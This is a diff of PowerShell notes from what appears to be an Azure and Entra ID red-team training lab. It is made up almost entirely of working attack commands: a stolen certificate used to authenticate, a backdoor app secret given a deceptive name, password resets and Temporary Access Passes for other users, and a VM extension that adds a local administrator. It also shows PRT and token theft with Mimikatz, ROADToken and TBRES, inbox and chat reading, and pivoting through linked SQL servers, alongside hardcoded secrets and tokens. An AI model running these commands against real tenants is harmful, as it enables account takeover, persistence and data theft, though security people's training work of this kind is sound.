-                'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer' 
-                'scope' = 'https://management.azure.com/.default'
-                'grant_type' = 'client_credentials'
-            })
-            $DataAnalyticsAppToken = "$($response.access_token)"
-            $DataAnalyticsAppToken
-            # Connect with the new signed jwt token
-            Connect-AzAccount -AccessToken $DataAnalyticsAppToken -AccountId f23a808b-6a01-4fb2-bfd9-bdb3e8390421
-            # Get Storage azure Token using Signed JWT
-            $TenantId = "d6bd5a42-7c65-421c-ad23-a25a5d5fa57f"
-            $uri = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
-            $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
-            $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
-            'client_id' = $DataAnalyticsAppID
-            'client_assertion' = $signedJWT
-            'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
-            'scope' = 'https://storage.azure.com/.default'
-            'grant_type' = 'client_credentials'
-            })
-            $DataAnalyticsAppStorageToken = "$($response.access_token)"
-
-            # Get the list of files present in the storage account.
-            $URL = "https://oildatastore.blob.core.windows.net/?comp=list"
-            $Params = @{
-            "URI" = $URL
-            "Method" = "GET"
-            "Headers" = @{
-            "Content-Type" = "application/json"
-            "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
-            "x-ms-version" = "2017-11-09"
-            "accept-encoding" = "gzip, deflate"
-            }
-            }
-            $Result = Invoke-RestMethod @Params -UseBasicParsing
-            $Result 
-        ###########
-
-        # Get permissions for stroage account
-            $Access_Token = (Get-AzAccessToken).Token
-            $stroageAccount = Get-AzStorageAccount
-            $SubscriptionID = (Get-AzSubscription).Id
-            $ResourceGroupName = $stroageAccount.ResourceGroupName
-            $StorageAccountName = $stroageAccount.StorageAccountName
-            $URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage/storageAccounts/$StorageAccountName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-            $RequestParams = @{
-                Method = 'GET'
-                Uri = $URI
-                Headers = @{
-                'Authorization' = "Bearer $Access_Token"
-                }
-            }
-            $Permissions = (Invoke-RestMethod @RequestParams).value
-            $Permissions | fl *
-        
-        # Get files of 'certificates' container from 'oildatastore' blob
-        $URL ="https://oildatastore.blob.core.windows.net/certificates?restype=container&comp=list"
-        $Params = @{
-        "URI" = $URL
-        "Method" = "GET"
-        "Headers" = @{
-            "Content-Type" = "application/json"
-            "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
-            "x-ms-version" = "2017-11-09"
-            "accept-encoding" = "gzip, deflate"
-            }
-           }
-        $XML=Invoke-RestMethod @Params -UseBasicParsing
-        #Remove BOM characters and list Blob names
-        $XML.TrimStart([char]0xEF,[char]0xBB,[char]0xBF) | Select-Xml -XPath "//Name" | foreach {$_.node.InnerXML}
-
-        
-        # Get certain file content (CertAttachment61.txt file) from 'certificates' container from 'oildatastore' blob
-            $URL ="https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt"
-            $Params = @{
-                "URI" = $URL
-                "Method" = "GET"
-                "Headers" = @{
-                    "Content-Type" = "application/json"
-                    "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
-                    "x-ms-version" = "2017-11-09"
-                    "accept-encoding" = "gzip, deflate"
-                }
-                }
-            $cert = Invoke-RestMethod @Params -UseBasicParsing
-            $cert
-            # Write the cert to disk 
-            $secretByte = [Convert]::FromBase64String($Cert)
-            [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\spcert.pfx",$secretByte)
-            # Compare the cert thumbprint with customKeyIdentifier from the KeyCredentials in each app , to check which app can use that cert
-            $spCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList 'C:\AzAD\Tools\spcert.pfx'
-            Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml | Where {$_.keyCredentials.customKeyIdentifier -eq $spCertificate.Thumbprint}
-
-        # Modify tags to add Department=>Geology as tag, becasue condition to read content that Department=>Geology  tag must be written
-        $URL = "https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt?comp=tags"
-        $Params = @{
-            "URI" = $URL
-            "Method" = "PUT"
-            "Headers" = @{
-            "Content-Type" = "application/xml; charset=UTF-8"
-            "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
-            "x-ms-version" = "2020-04-08"
-            }
-        }
-        $Body = @"
-        <?xml version="1.0" encoding="utf-8"?>
-        <Tags>
-            <TagSet>
-                <Tag>
-                    <Key>Department</Key>
-                    <Value>Geology</Value>
-                </Tag>
-            </TagSet>
-        </Tags>
+$URL = "https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt?comp=tags"
+$Params = @{
+    URI     = $URL
+    Method  = "PUT"
+    Headers = @{
+        "Content-Type"  = "application/xml; charset=UTF-8"
+        "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
+        "x-ms-version"  = "2020-04-08"
+    }
+}
+$Body = @"
+<?xml version="1.0" encoding="utf-8"?>
+<Tags>
+    <TagSet>
+        <Tag>
+            <Key>Department</Key>
+            <Value>Geology</Value>
+        </Tag>
+    </TagSet>
+</Tags>
 "@
-    Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+Invoke-RestMethod @Params -UseBasicParsing -Body $Body
 
-    # IF u got a cert, and it has empty subscription when u authenticate through az cli ps , u can use mg module to enumerate entra id role assigments
-    # authenticate with cert 
-    [X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
-    Connect-MgGraph -Certificate $GeologyAppCertificate -ClientId b1d10eb3-d631-499f-8197-f13de675904c -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
-    # Get app id of SP we curretly authenticated to
-    Get-MgServicePrincipal  -Filter "DisplayName eq 'GeologyApp'"
-    # Filter entra id roles for our SP using it's id:
-    Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'eef35297-f198-4dd9-9027-04dc69a05ca2'" | ForEach-Object {
-        $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
+# ============================================================
+# ENTRA ID ROLE ASSIGNMENTS VIA GRAPH (cert auth, no subscription)
+# ============================================================
+
+[X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
+Connect-MgGraph `
+    -Certificate $GeologyAppCertificate `
+    -ClientId    b1d10eb3-d631-499f-8197-f13de675904c `
+    -TenantId    d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
+
+# Get SP for current app
+Get-MgServicePrincipal -Filter "DisplayName eq 'GeologyApp'"
+
+# Get Entra ID roles for the SP
+Get-MgRoleManagementDirectoryRoleAssignment `
+    -Filter "principalId eq 'eef35297-f198-4dd9-9027-04dc69a05ca2'" |
+    ForEach-Object {
+        $roleDef = Get-MgRoleManagementDirectoryRoleDefinition `
+            -UnifiedRoleDefinitionId $_.RoleDefinitionId
         [PSCustomObject]@{
-        RoleDisplayName = $roleDef.DisplayName
-        RoleId = $roleDef.Id
-        DirectoryScopeId = $_.DirectoryScopeId
+            RoleDisplayName  = $roleDef.DisplayName
+            RoleId           = $roleDef.Id
+            DirectoryScopeId = $_.DirectoryScopeId
         }
-       } | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | fl
-    # Get App roles
-    Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId 578e381a-8f03-4cae-8b3e-559d02023ee1 | fl
-    # Get certain app role definiation :
-    (Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'").AppRoles | ? {$_.id -eq '246dd0d5-5bd0-4def-940b-0421030a5b68' } | fl
-    
+    } | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | Format-List
 
-    # Get members of certain administratie unit (e.g Helpdesk administrators->DirectoryScopeId )
-    Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId b14fcc2e-7a5a-4935-b4a5-835fd8018efe | select Id, @{Name='userPrincipalName';Expression={$_.AdditionalProperties.userPrincipalName}} | fl
-    # If we have the previous pririvlage, we can reset user's members
-    $passwordProfile = @{
-        forceChangePasswordNextSignIn = $false
-        password = 'NewUserSSecret@Pass61'
+# Get app role assignments for a SP
+Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId 578e381a-8f03-4cae-8b3e-559d02023ee1 | Format-List
+
+# Get a specific app role definition
+(Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'").AppRoles |
+    Where-Object { $_.Id -eq '246dd0d5-5bd0-4def-940b-0421030a5b68' } |
+    Format-List
+
+# ---- Administrative Unit members ----
+
+Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId b14fcc2e-7a5a-4935-b4a5-835fd8018efe |
+    Select-Object Id, @{
+        Name       = 'userPrincipalName'
+        Expression = { $_.AdditionalProperties.userPrincipalName }
+    } | Format-List
+
+# ---- Application Administrator — add creds to app ----
+
+Get-MgApplication -ApplicationId da53a80e-cb86-4158-96e1-7b19f7fec496
+
+$passwordCred = @{
+    displayName = 'Added by Azure Service Bus - DO NOT DELETE'
+    endDateTime = (Get-Date).AddMonths(6)
+}
+Add-MgApplicationPassword `
+    -ApplicationId      da53a80e-cb86-4158-96e1-7b19f7fec496 `
+    -PasswordCredential $passwordCred
+
+# Get owned objects for a SP
+Get-MgServicePrincipalOwnedObject -ServicePrincipalId 1e2dc461-ecae-4a2b-aa61-3aa8622c1344 |
+    Select-Object Id,
+        @{ Name = 'displayName';  Expression = { $_.AdditionalProperties.displayName } },
+        @{ Name = 'ObjectType';   Expression = { $_.AdditionalProperties.'@odata.type' } } |
+    Format-List
+
+# Add a user to a group
+New-MgGroupMember `
+    -GroupId           91f7bfb1-b326-4376-8953-5d6d9b44e443 `
+    -DirectoryObjectId 2b269505-f49b-42c1-ae65-d22dc1faabe4 `
+    -Verbose
+
+# ============================================================
+# CONDITIONAL ACCESS POLICIES (CAPs)
+# ============================================================
+
+Connect-MgGraph `
+    -Certificate $GeologyAppCertificate `
+    -ClientId    b1d10eb3-d631-499f-8197-f13de675904c `
+    -TenantId    d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
+
+# Check current scopes (need Policy.Read.All)
+Get-MgContext
+
+# Enumerate all CAPs
+Get-MgIdentityConditionalAccessPolicy | ConvertTo-Json -Depth 10 | Out-File caps.json
+
+# Enumerate CAPs via REST
+$URI = 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $GraphToken" }
+}
+$CAPs = (Invoke-RestMethod @RequestParams).value | ForEach-Object { $_ | ConvertTo-Json -Depth 10 }
+
+# Extract access token from MgGraph in-memory cache (when you need raw token)
+$InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod(
+    "ReadTokenData",
+    [System.Reflection.BindingFlags]::NonPublic + [System.Reflection.BindingFlags]::Instance
+)
+$TokenData    = $InMemoryTokenCacheGetTokenData.Invoke(
+    [Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,
+    $null
+)
+$TokenObjStr  = [System.Text.Encoding]::UTF8.GetString($TokenData)
+$obj          = $TokenObjStr -Split "`"secret`":`""
+$obj          = $obj[1] -Split "`",`"credential_type"
+$token        = $obj[0]
+
+# ============================================================
+# TEMPORARY ACCESS PASS (TAP)
+# ============================================================
+
+# Check if TAP is enabled (requires Policy.Read.All)
+(Get-MgPolicyAuthenticationMethodPolicy).AuthenticationMethodConfigurations
+
+# Create a TAP for a user
+$properties = @{
+    isUsableOnce  = $true
+    startDateTime = (Get-Date).AddMinutes(60)
+}
+New-MgUserAuthenticationTemporaryAccessPassMethod `
+    -UserId          explorationsyncuser61@oilcorporation.onmicrosoft.com `
+    -BodyParameter   ($properties | ConvertTo-Json)
+
+# ============================================================
+# SERVICE PRINCIPAL CREDENTIAL AUTH
+# ============================================================
+
+# Authenticate as SP using client secret
+$passwd = ConvertTo-SecureString "ylz8Q~kasdfasdfasfdasdfasZZZZdfas" -AsPlainText -Force
+$creds  = New-Object System.Management.Automation.PSCredential(
+    "ebf26192-9eb1-47a8-8554-739ef769b00a",
+    $passwd
+)
+Connect-AzAccount `
+    -ServicePrincipal `
+    -Credential       $creds `
+    -Tenant           4e7a1151-36d0-457e-b489-729cf0fb315a
+
+Connect-MgGraph `
+    -ClientSecretCredential $creds `
+    -TenantId               d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
+
+# ---- Dynamic group abuse ----
+Update-MgUser `
+    -UserId      5dec6744-f973-4fb7-ab07-2542d41dfb75 `
+    -OtherMails  @('vendor17@defcorpextcontractors.onmicrosoft.com')
+
+# ============================================================
+# LIST ALL RESOURCE PERMISSIONS
+# ============================================================
+
+$FormatEnumerationLimit = -1  # Disable truncation
+$Resources = Get-AzResource
+$Token     = (Get-AzAccessToken).Token
+
+foreach ($Resource in $Resources) {
+    $ID  = $Resource.Id
+    $URI = "https://management.azure.com/$ID/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+    $RequestParams = @{
+        Method      = 'GET'
+        Uri         = $URI
+        Headers     = @{ 'Authorization' = "Bearer $Token" }
+        ContentType = "application/json"
     }
-    Update-MgUser -UserId AS-5945632460@oilcorptarsands.onmicrosoft.com -PasswordProfile $passwordProfile
+    $Result       = Invoke-RestMethod @RequestParams
+    $ResourceName = $Resource.Name
+    Write-Output "ResourceName - $ResourceName"
+    Write-Output "Permissions -"
+    $Result.value | Format-List *
+}
 
-    # If you have applicatio adminstrator privilege, we can add creds to app, let's enumerate that: 
-    Get-MgApplication -ApplicationId da53a80e-cb86-4158-96e1-7b19f7fec496 # -ApplicationId=DirectoryScopedId
-    $passwordCred = @{
-        displayName = 'Added by Azure Service Bus - DO NOT DELETE'
-        endDateTime = (Get-Date).AddMonths(6)
+# ============================================================
+# ACCESS USER INBOX EMAILS
+# ============================================================
+
+Connect-MgGraph -AccessToken ($AccessToken | ConvertTo-SecureString -AsPlainText -Force)
+Get-MgUserMessage -UserId CaseyRSawyer@oilcorporation.onmicrosoft.com | Format-List
+
+# ============================================================
+# VM EXTENSION — CODE EXECUTION
+# ============================================================
+
+# Get existing extensions
+Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
+
+# Write extension to execute arbitrary command (add local admin)
+Set-AzVMExtension `
+    -ResourceGroupName  "Research" `
+    -ExtensionName      "ExecCmd" `
+    -VMName             "infradminsrv" `
+    -Location           "Germany WestCentral" `
+    -Publisher          Microsoft.Compute `
+    -ExtensionType      CustomScriptExtension `
+    -TypeHandlerVersion 1.8 `
+    -SettingString      '{"commandToExecute":"powershell net users student17 Stud17Password@123 /add /Y; net localgroup administrators student17 /add"}'
+
+# ============================================================
+# PRT EXTRACTION
+# ============================================================
+
+# Get nonce (can be run from any machine)
+$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
+$URL      = "https://login.microsoftonline.com/$TenantId/oauth2/token"
+$Params   = @{ URI = $URL; Method = "POST" }
+$Body     = @{ grant_type = "srv_challenge" }
+$Result   = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+$Result.Nonce
+
+# Use the nonce to extract PRT
+C:\Users\student17\Documents\ROADToken.exe $Result.Nonce
+
+# Copy tools to remote session and extract PRT from a target user's session
+Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe       -Destination C:\Users\student17\Documents -Verbose
+Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe        -Destination C:\Users\student17\Documents -Verbose
+Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student17\Documents -Verbose
+
+Invoke-Command -Session $infradminsrv -ScriptBlock {
+    C:\Users\student17\Documents\PsExec64.exe -accepteula -s "cmd.exe" `
+        "/c C:\Users\student17\Documents\SessionExecCommand.exe MichaelMBarron C:\Users\student17\Documents\ROADToken.exe <NONCE> > C:\Temp\PRT17.txt"
+}
+Invoke-Command -Session $infradminsrv -ScriptBlock { cat C:\Temp\PRT17.txt }
+
+# Extract PRT via Mimikatz
+Invoke-Command -Session $infradminsrv -ScriptBlock {
+    . C:\Users\student17\Documents\Invoke-Mimikatz.ps1
+    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" "exit"'
+}
+
+# Extract PRT via AADInternals
+Get-AADIntUserPRTToken
+
+# ============================================================
+# AD-JOINED DEVICE RECON
+# ============================================================
+
+# Check if machine is AD/AAD joined
+dsregcmd /status
+
+# Get user data from instance metadata
+$userData = Invoke-RestMethod `
+    -Headers @{ "Metadata" = "true" } `
+    -Method  GET `
+    -Uri     "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
+
+# Alternative (AWS-style metadata — check if EC2)
+(Invoke-WebRequest http://169.254.169.254/latest/user-data -UseBasicParsing).RawContent
+(Invoke-WebRequest http://169.254.169.254/latest/meta-data/hostname -UseBasicParsing).Content
+(Invoke-WebRequest http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance -UseBasicParsing).Content
+
+# List running processes with username
+Get-Process -IncludeUserName | ForEach-Object {
+    [PSCustomObject]@{
+        procName = $_.ProcessName
+        username = $_.UserName
+        Id       = $_.Id
     }
-    Add-MgApplicationPassword -ApplicationId da53a80e-cb86-4158-96e1-7b19f7fec496 -PasswordCredential $passwordCred
-    # if we have access to SP, we can enumerate what are the owned objects for this SP, -ServicePrincipalId from Get-MgServicePrincipal command
-    Get-MgServicePrincipalOwnedObject -ServicePrincipalId 1e2dc461-ecae-4a2b-aa61-3aa8622c1344 | select Id, @{Name='displayName';Expression={$_.AdditionalProperties.displayName}},@{Name ='ObjectTyoe';Expression={$_.AdditionalProperties.'@odata.type'}} | fl
+}
 
-    # Add user to group 
-        #DirectoryObjectId : User id we want to add
-        New-MgGroupMember -GroupId 91f7bfb1-b326-4376-8953-5d6d9b44e443 -DirectoryObjectId  2b269505-f49b-42c1-ae65-d22dc1faabe4 -Verbose
+# ============================================================
+# DUMP OFFICE / ONEDRIVE ACCESS TOKENS FROM DISK
+# ============================================================
 
-    # Enumerate All CAPs: 
-        [X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
-        Connect-MgGraph -Certificate $GeologyAppCertificate -ClientId b1d10eb3-d631-499f-8197-f13de675904c -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
-        # we need policy.read.all privileg, to know if you have,check Scopes :
-        Get-MgContext
-        # Enum all CAPs (check DisplayName,BuiltInControls)
-        Get-MgIdentityConditionalAccessPolicy | ConvertTo-Json | Out-File caps.json
-        # Enum if CAP applied to certain group ID
+# Copy tools to target session
+Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\TBRES\               -Destination C:\Users\Public\student61 -Recurse -Verbose
+Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\Invoke-RunasCs.ps1   -Destination C:\Users\Public\student61 -Verbose
 
-        
-        # Enumerate CAP using RAW API
-        # Get Extract access Token from MgGraph Tool (Dirty way)
-        $InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod("ReadTokenData",[System.Reflection.BindingFlags]::NonPublic+[System.Reflection.BindingFlags]::Instance)
-        $TokenData = $InMemoryTokenCacheGetTokenData.Invoke([Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,$null)
-        $TokenObjStr = [System.Text.Encoding]::UTF8.GetString($TokenData)
-        $obj = $TokenObjStr -Split "`"secret`":`"" 
-        $obj = $obj[1] -Split "`",`"credential_type"
-        $token = $obj[0]
+# Run TBRES as local admin to decrypt tokens
+. C:\Users\Public\student61\Invoke-RunasCs.ps1
+Invoke-RunasCs `
+    -Username administrator `
+    -Password '%dlTKmropc!1l3I(o1j5834H$0VZ))2p' `
+    -Command  C:\Users\Public\student61\TBRES.exe
 
-        Connect-MgGraph 
-        Connect-MgGraph -Scopes "Policy.Read.All" -Certificate $clientCertificate2 -ClientId 578e381a-8f03-4cae-8b3e-559d02023ee1 -TenantId 2e0d024c-5e44-47f7-b4b8-42126b542e36
-        $Token = $GraphToken    
-        $URI = 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies'
-        $RequestParams = @{
-         Method = 'GET'
-         Uri = $URI
-         Headers = @{
-         'Authorization' = "Bearer $Token"
-         }
-        }
-        $CAPs = (Invoke-RestMethod @RequestParams).value  | % {$_ | ConvertTo-Json}  
-    # Get access Token from MgGraph Tool (Dirty way)
-        $InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod("ReadTokenData",[System.Reflection.BindingFlags]::NonPublic+[System.Reflection.BindingFlags]::Instance)
-        $TokenData = $InMemoryTokenCacheGetTokenData.Invoke([Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,$null)
-        $TokenObjStr = [System.Text.Encoding]::UTF8.GetString($TokenData)
-        $obj = $TokenObjStr -Split "`"secret`":`"" 
-        $obj = $obj[1] -Split "`",`"credential_type"
-        $token = $obj[0]
+# Find most recently written decrypted token files
+Get-ChildItem C:\Windows\System32\*.decrypted |
+    Sort-Object -Property LastWriteTime -Descending
 
-    # TAP Enum 
-        # Check if TAP enabled, we need Policy.Read.All permissions 
-            [X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
-            Connect-MgGraph -Certificate $GeologyAppCertificate -ClientId b1d10eb3-d631-499f-8197-f13de675904c -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
-            (Get-MgPolicyAuthenticationMethodPolicy).AuthenticationMethodConfigurations
-        # We can create a TAP for explorationsyncuser61 user :
-            $properties = @{}
-            $properties.isUsableOnce = $True
-            $properties.startDateTime = (Get-Date).AddMinutes(60)
-            $propertiesJSON = $properties | ConvertTo-Json
-            New-MgUserAuthenticationTemporaryAccessPassMethod -UserId explorationsyncuser61@oilcorporation.onmicrosoft.com -BodyParameter $propertiesJSON | fl
+# Check aud claim of each JWT to identify Graph tokens
 
-    # Logic App Enum
-        # Permissions
-            $accesstoken = (Get-AzAccessToken).Token
-            $URI = "https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-oyglsntcfh3343536/providers/Microsoft.Logic/workflows/ASyaivrkblez3343584/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-            $RequestParams = @{
-                Method = 'GET'
-                Uri = $URI
-                Headers = @{
-                'Authorization' = "Bearer $accesstoken"
-                }
-            }
-            $Permissions = (Invoke-RestMethod @RequestParams).value
-            $Permissions.actions
-        # Getting definition/json code of logic App 
-            (Get-AzLogicApp -Name ASyaivrkblez3343584).Definition
-        # Getting callback url for logic app 
-            Get-AzLogicAppTriggerCallbackUrl -TriggerName manual -Name ASyaivrkblez3343584 -ResourceGroupName AS-oyglsntcfh3343536
-        # Executing callbackURL  
-            Invoke-RestMethod -Method GET -UseBasicParsing -Uri 'https://prod-54.southeastasia.logic.azure.com:443/workflows/e0dc8e964e5a4556a347d4fceef1417e/triggers/manual/paths/invoke?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=_YiemEHZwmmdThIlXH_JLX-8-ubyxWEK0DqvV0NRENM'
-        
-    # Auth to on premise (password should NOT have !)
-    # Host file must have records for DC and AD Domain e.g 
-        # 172.16.30.1 reservoirone.corp
-        # 172.16.30.1 reservoirone-dc.reservoirone.corp
-    runas /netonly /user:reservoirone.corp\hybriduser1 cmd
-    C:\AzAD\Tools\InviShell\RunWithPathAsAdmin.bat
-    . C:\AzAD\Tools\PowerView.ps1
-    Get-DomainComputer -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp
-    # Get domain all ACLs, convert sid to name
-    Get-DomainObjectAcl -SearchBase "DC=reservoirone,DC=corp" -SearchScope Base -ResolveGUIDs -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp);$_}
+# ---- OneDrive file enumeration using Graph AT ----
 
-    # Github 
-        # Create an issue
-            $url = "https://api.github.com/repos/OilCorp/awsautomation/issues"
-            $accessToken = "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"
-            $headers = @{
-                "Authorization" = "Bearer $accessToken"
-                "Content-Type" = "application/json"
-            }
+$GraphAccessToken = "..."
+$Params = @{
+    URI     = "https://graph.microsoft.com/beta/me/drive/root/children"
+    Method  = "GET"
+    Headers = @{
+        "Authorization" = "Bearer $GraphAccessToken"
+        "Content-Type"  = "application/json"
+    }
+}
+$Result = Invoke-RestMethod @Params -UseBasicParsing
+$Result.value
 
-            $body = @{
-                title = "NewIssueX" 
-                body = "NewIssueX"
-            } | ConvertTo-Json -Depth 4
+# Get download URL for a specific file
+($Result.value | Where-Object { $_.Name -eq 'accessingplantinfo.ps1' }).'@microsoft.graph.downloadUrl'
 
-            Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body
-        # Read comments on certain issue
-            $url = "https://api.github.com/repos/OilCorp/awsautomation/issues/39/comments"
-            $accessToken = "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"
-            $headers = @{
-                "Authorization" = "Bearer $accessToken"
-                "Content-Type" = "application/json"
-            }
+# ============================================================
+# LOGIC APPS
+# ============================================================
 
-            (Invoke-RestMethod -Uri $url -Method Get -Headers $headers).Body
-    
-    
+# Check permissions on a Logic App
+$accesstoken = (Get-AzAccessToken).Token
+$URI = "https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-oyglsntcfh3343536/providers/Microsoft.Logic/workflows/ASyaivrkblez3343584/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $accesstoken" }
+}
+(Invoke-RestMethod @RequestParams).value.actions
 
-    # Chat Teams message enum
-        # Get All the chats 
-            Get-MgChat | fl
-        # List the Messages
-            Get-MgChatMessage -ChatId 19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces | fl
-        # List undeleted messages   
-            (Get-MgChatMessage -ChatId 19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces -ChatMessageId 1684154301636).Body.Content
-        # Get certiain user 
-            Get-MgUser -All | Where {$_.DisplayName -like "*Carl*"}
-    # Arc machine enum
-        # Check if there are any registered managed service 
-            Get-AzManagedServicesAssignment | fl *
-        # Execute commands on Arc machine (requires 10-15 min until output)
-            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "whoami"
-        # Check if Arc machine has SQL server (potential linked SQL server)
-            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "net start | Select-String 'SQL'"
-        # Check if there are any Linked servers to the SQL Server: 
-            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers')`""
-        # Check if the EDI linked server has any linked server 
-            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers') AT [EDI]`""
-        # Reterive databases from the AZURESQL linked server command 
-            $ServerName = 'AZURESQL'
-            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_catalogs $ServerName') AT [EDI]`""
-        # let us try retrieving the tables from   'oilcorp_logistics_database' database
-            $ServerName = 'AZURESQL'
-            $DBName = 'oilcorp_logistics_database'
-            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_tables_ex @table_server = $ServerName, @table_catalog = $DBName') AT [EDI]`"" 
-        # View certain "inventory" table content from oilcorp_logistics_database DB:
-            New-AzConnectedMachineRunCommand -MachineName 'ff-machine' -ResourceGroupName 'FFDBMachineRG' -RunCommandName 'SQLQueryX' -Location 'East US' -SourceScript "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('SELECT * FROM [AZURESQL].[oilcorp_logistics_database].[dbo].[inventory]') AT [EDI]`""
-        # Get Cert thumbprint
-            Get-PfxCertificate -FilePath C:\Users\studentuserX\Downloads\Miro_Certificate.pfx
-        
-        
+# Get Logic App definition
+(Get-AzLogicApp -Name ASyaivrkblez3343584).Definition
+
+# Get callback URL for Logic App trigger
+Get-AzLogicAppTriggerCallbackUrl `
+    -TriggerName       manual `
